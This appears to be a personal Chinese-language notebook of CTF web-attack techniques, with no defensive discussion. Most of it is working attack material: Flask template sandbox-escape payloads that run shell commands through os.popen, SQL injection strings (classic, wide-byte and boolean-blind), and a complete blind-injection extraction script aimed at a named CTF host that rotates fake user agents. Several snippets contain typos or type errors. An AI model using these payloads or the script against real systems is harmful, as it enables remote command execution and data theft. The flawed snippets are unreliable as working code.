# [个人] 零基础的Web笔记



# Python框架Flask的沙箱逃逸

## 内置函数

### 查看内置函数组

```python
 ().__class__.__base__.__subclasses__()
```

```python
 ().__class__.__bases__[0].__subclasses__()
```

```python
getattr(().__class__.__base__, "__subclasses__")()
```

```python
getattr(().__class__.__bases__[0], "__subclasses__")()
```

找到函数`<class 'os._wrap_close'>`位于第`137`位

### 调用内置函数

```python
().__class__.__base__.__subclasses__()[137].__init__.__globals__.popen("ls"+" "+"/").read()
```

```python
().__class__.__base__.__subclasses__()[137].__init__.__globals__["popen"]("ls"+" "+"/").read()
```

```python
().__class__.__bases[0]__.__subclasses__()[137].__init__.__globals__.popen("ls"+" "+"/").read()
```

```python
().__class__.__bases[0]__.__subclasses__()[137].__init__.__globals__["popen"]("ls"+" "+"/").read()
```

```python
exec("error=().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat'+' '+'/'+'f'+'l'+'a'+'g').read();raise Exception(f'{error}')")
```

```
exec("error=\"abc\";raise Exception("abc")")
```



# SQL注入

## 常规注入

### 确认注释类型

- #
- --
- --+

### 测试恶意查询

```sql
' or true #
```

### 测试字段数量

```sql
' order by 3 #
```

### 联表查询字段

```sql
' union select all null,null,null from users #
```



## 宽体注入

### 确认注释类型

- #
- --
- --+

### 测试恶意查询

```sql
%81' or true #
```

### 测试字段数量

```sql
%81' order by 3 #
```

### 联表查询字段

```sql
%81' union select all null,null,null from users #
```



## 布尔盲注

### 确认注释类型

- #
- --
- --+

### 测试恶意查询

```sql
' or true #
```

### 测试字段数量

```sql
' order by 3 #
```

### 联表查询字段

```sql
' union select all null,null,null from users #
```

**测试盲注函数**

```sql
' union select all null,null,null from users where length(null) >= 10 #
```

```sql
' union select all null,null,null from users where substr(null, 0, 4) == "flag" #
```

```sql
' union select all null,null,null from users where substr(null, 0, 4) == "flag" and substr(null, 4, 1) == "{" #
```

### 编写盲注脚本

```python
import time
import requests
import fake_useragent

def getFlagFromSqlBlindBet(url: str, key: str = "id", field: str = "id", fieldLength: int = 1, table: str = "users", flagFormat: str = "flag{}", flagLength: int = 1, rightMark: str = "Right", isPost: bool = True, sleepTime: int = 100) -> str:

    # 初始化变量
    flag = flagFormat[:flagFormat.__len__() - 1]
    flagContentIndex = flagFormat.__len__()
    global response

    # 遍历 flag 长度
    while True:
        try:
            data = {key: rf"' union select all {field}{",null" * (fieldLength - 1)} from {table} where length({field}) >= {flagLength} --"}
            if isPost:
                response = requests.post(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data)
            else:
                response = requests.get(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data)

            if response.content.decode().__contains__(rightMark):
                print(f"已遍历flag长度: {flagLength}")
                flagLength += 1
            else:
                flagLength -= 1
                print(f"找到flag长度: {flagLength}")
                break
        except requests.exceptions.ConnectionError:
            time.sleep(sleepTime)

    # 遍历 flag 内容
    while flag.__len__() < flagLength - 1:
        i = 33
        while i < 126 + 1:
            try:
                data = {field: rf"' union select all {field}{", null" * (fieldLength - 1)} from {table} where substr({field}, 1, {flagFormat.__len__() - 1}) = '{flagFormat[:flagFormat.__len__() - 1]}' and substr({field}, {flagContentIndex}, 1) = '{chr(i)}' --"}
                response = requests.post(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data)
                if response.content.decode().__contains__("Right"):
                    flag += chr(i)
                    print(f"找到flag第{flagContentIndex}个字符为{chr(i)+"("+i+")"}: {flag + flagFormat[-1]}")
                    flagContentIndex += 1
                    break
                else:
                    print(f"已遍历flag第{flagContentIndex}个字符{chr(i)+"("+i+")"}")
                    i += 1
            except requests.exceptions.ConnectionError:
                time.sleep(sleepTime)
    flag += flagFormat[-1]

    print(f"得到flag: {flag}")
    return flag

if __name__ == "__main__":
    print(getFlagFromSqlBlindBet("http://fliaz.top:32864/", key = "username", field = "password", fieldLength = 5, table = "users", flagFormat = "pkwsec{}", flagLength = 44, rightMark = "Right"))
```
